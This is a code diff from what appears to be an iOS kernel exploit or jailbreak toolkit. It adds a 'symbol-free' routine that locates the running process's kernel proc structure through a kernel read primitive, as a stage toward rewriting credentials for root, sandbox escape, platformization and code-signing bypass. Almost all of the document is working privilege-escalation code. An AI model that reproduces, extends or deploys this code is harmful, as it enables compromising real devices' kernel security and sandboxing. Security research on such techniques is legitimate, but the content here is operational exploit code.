@@ -7,6 +7,7 @@
 #import "Lum1naStructOffsets.h"
 #import "Lum1naBoard.h"
 #import "Lum1naKreadLane.h"
+#import "Lum1naProcFind.h"
 #import "../Exploit/LabRuntimeOffsets.h"
 #import "../Exploit/LabLocalTime.h"
 #import "../Exploit/lumina_core.h"
@@ -84,49 +85,65 @@ static BOOL el_looks_static(uint64_t v) {
     }
 
     uint64_t slide = b.kslide;
-    if (!po->kernproc && ![b provenKernproc]) {
-        el_bad(s, @"elevate HOLD - kernproc VA underived for %@ (LabProcOff 0 AND no p094 proven value).",
-               off ? [NSString stringWithUTF8String:off->tag] : @"?");
-        el_log(s, @"Unlock path: tap P094 kernproc derive (catalog p094) on this device, then re-run.");
-        el_log(s, @"uid0/unsandbox/platformize not attempted; AMFI/inject continue sandboxed (expected EPERM).");
-        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"kernproc-underived" source:@"elevate"];
-        return s;
-    }
-    uint64_t kernprocStatic = po->kernproc ? po->kernproc : [b provenKernproc];
-    NSString *kpSource = po->kernproc ? @"LabProcOff" : @"p094-proven";
-    uint64_t kernproc = kernprocStatic + slide;
-    el_log(s, @"kernproc source %@: unslid 0x%llx", kpSource, (unsigned long long)kernprocStatic);
-
-    // 1. find our proc: kernproc is proc 0 (oldest); walk p_list.le_prev
-    //    backward. le_prev holds &prev->le_next, and le_next sits at
-    //    offset 0, so the value IS the previous proc. When the value is
-    //    STATIC (0xFFFFFFF0...) it is &proc0.le_next == proc0 itself
-    //    (proc0 is a static kernel global; p_list sits at offset 0).
-    if (el_kread32(kernproc + po->proc_pid) != 0) {
-        el_bad(s, @"elevate HOLD - kernproc sanity failed (pid!=0 at 0x%llx). VA wrong; keep underived.",
-               (unsigned long long)kernproc);
-        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"kernproc-sanity" source:@"elevate"];
-        return s;
-    }
     pid_t mypid = getpid();
-    uint64_t cur = kernproc, selfp = 0;
-    for (int i = 0; i < 4096; i++) {
-        if (el_kread32(cur + po->proc_pid) == (uint32_t)mypid) { selfp = cur; break; }
-        uint64_t prev = cs2_unpac_ptr(el_kread64(cur + po->proc_list_prev));
-        if (!prev || prev == cur) break;
-        if (el_looks_zone(prev)) { cur = prev; continue; }
-        if (el_looks_static(prev)) {
-            /* proc0 edge: static le_prev IS proc0's address. */
-            if (el_kread32(prev + po->proc_pid) == 0) { cur = prev; continue; }
+    uint64_t selfp = 0;
+
+    if (!po->kernproc && ![b provenKernproc]) {
+        /* NOVEL LOCATOR (2026-11-07): no allproc/kernproc symbol needed.
+           mach_port_kobject(task_self) -> task_t, then scan the task struct
+           for bsd_info (a zone pointer whose +pid is ours and whose
+           +proc_ro is a zone pointer). Dopamine's ksymbol(allproc) route
+           needs XPF; this route needs only the live kread lane. */
+        el_log(s, @"kernproc underived — symbol-free locator (task kobject → bsd_info scan)");
+        NSString *how = nil;
+        selfp = Lum1naFindSelfProc((uint32_t)mypid, po->proc_pid,
+                                   po->proc_proc_ro, &how);
+        el_log(s, @"locator: %@", how ?: @"?");
+        if (!selfp) {
+            el_bad(s, @"elevate HOLD - self-proc not located without allproc.");
+            el_log(s, @"Fallbacks: tap P094 kernproc derive (catalog p094), or a jailbroken provider.");
+            el_log(s, @"uid0/unsandbox/platformize not attempted; AMFI/inject continue sandboxed (expected EPERM).");
+            [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold"
+                                       detail:@"self-proc-not-found" source:@"elevate"];
+            return s;
         }
-        break;
+        el_ok(s, @"proc_self = 0x%llx (pid %d, symbol-free)", (unsigned long long)selfp, mypid);
+    } else {
+        uint64_t kernprocStatic = po->kernproc ? po->kernproc : [b provenKernproc];
+        NSString *kpSource = po->kernproc ? @"LabProcOff" : @"p094-proven";
+        uint64_t kernproc = kernprocStatic + slide;
+        el_log(s, @"kernproc source %@: unslid 0x%llx", kpSource, (unsigned long long)kernprocStatic);
+
+        // 1. find our proc: kernproc is proc 0 (oldest); walk p_list.le_prev
+        //    backward. le_prev holds &prev->le_next, and le_next sits at
+        //    offset 0, so the value IS the previous proc. When the value is
+        //    STATIC (0xFFFFFFF0...) it is &proc0.le_next == proc0 itself
+        //    (proc0 is a static kernel global; p_list sits at offset 0).
+        if (el_kread32(kernproc + po->proc_pid) != 0) {
+            el_bad(s, @"elevate HOLD - kernproc sanity failed (pid!=0 at 0x%llx). VA wrong; keep underived.",
+                   (unsigned long long)kernproc);
+            [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"kernproc-sanity" source:@"elevate"];
+            return s;
+        }
+        uint64_t cur = kernproc;
+        for (int i = 0; i < 4096; i++) {
+            if (el_kread32(cur + po->proc_pid) == (uint32_t)mypid) { selfp = cur; break; }
+            uint64_t prev = cs2_unpac_ptr(el_kread64(cur + po->proc_list_prev));
+            if (!prev || prev == cur) break;
+            if (el_looks_zone(prev)) { cur = prev; continue; }
+            if (el_looks_static(prev)) {
+                /* proc0 edge: static le_prev IS proc0's address. */
+                if (el_kread32(prev + po->proc_pid) == 0) { cur = prev; continue; }
+            }
+            break;
+        }
+        if (!selfp) {
+            el_bad(s, @"elevate HOLD - our proc (pid %d) not found in allproc backward walk", mypid);
+            [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"proc-not-found" source:@"elevate"];
+            return s;
+        }
+        el_ok(s, @"proc_self = 0x%llx (pid %d)", (unsigned long long)selfp, mypid);
     }
-    if (!selfp) {
-        el_bad(s, @"elevate HOLD - our proc (pid %d) not found in allproc backward walk", mypid);
-        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"proc-not-found" source:@"elevate"];
-        return s;
-    }
-    el_ok(s, @"proc_self = 0x%llx (pid %d)", (unsigned long long)selfp, mypid);
 
     // 2. proc -> proc_ro -> ucred
     uint64_t proc_ro = cs2_unpac_ptr(el_kread64(selfp + po->proc_proc_ro));
